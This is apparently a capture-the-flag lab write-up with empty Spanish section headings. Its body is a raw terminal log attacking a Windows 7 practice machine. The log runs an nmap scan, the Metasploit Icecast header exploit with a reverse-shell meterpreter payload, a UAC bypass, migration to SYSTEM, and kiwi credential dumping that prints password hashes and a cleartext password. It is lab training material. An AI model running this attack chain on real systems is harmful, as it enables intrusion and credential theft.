## Objetivo
## Pistas
## Solución

```

──(kali㉿kali)-[~]
└─$ nmap -sV -v 10.10.61.198 --min-rate 5000 -p- 


: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http               Icecast streaming media server


Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap


2///

┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search Icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header 




[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasp
                                      loit.com/docs/using-metasploit/basics/using
                                      -metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread
                                        , process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be s
                                        pecified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.




////


View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.61.198
rhosts => 10.10.61.198
msf6 exploit(windows/http/icecast_header) > set lhost tun0
lhost => 10.9.0.44
msf6 exploit(windows/http/icecast_header) > options




msf6 exploit(windows/http/icecast_header) > exploit

3///////
meterpreter 

meterpreter > getuid 
Server username: Dark-PC\Dark
meterpreter > 

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 

/////

meterpreter > run post/multi/recon/local_exploit_suggester


[*] 10.10.61.198 - Collecting local exploits for x86/windows...
[*] 10.10.61.198 - 191 exploit checks are being tried...
[+] 10.10.61.198 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.




meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > sessions


//////


msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/bypassuac_eventvwr) > set lport 5555
lport => 5555
msf6 exploit(windows/local/bypassuac_eventvwr) > options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread
                                        , process, none)
   LHOST     tun0             yes       The listen address (an interface may be s
                                        pecified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_eventvwr) > 




msf6 exploit(windows/local/bypassuac_eventvwr) > exploit

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > 

ps

meterpreter > migrate 1368
[*] Migrating from 1488 to 1368... 

meterpreter > getuid                                                               
Server username: NT AUTHORITY\SYSTEM                                               
meterpreter > 


meterpreter > load kiwi
Loading extension kiwi...

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                   NTLM                 SHA1
--------  ------   --                   ----                 ----
Dark      Dark-PC  e52cac67419a9a22ecb  7c4fe5eada682714a03  0d082c4b4f2aeafb67fd
                   08369099ed302        6e39378362bab        0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials


help kiwi


```

## Notas adicionales
## Referencias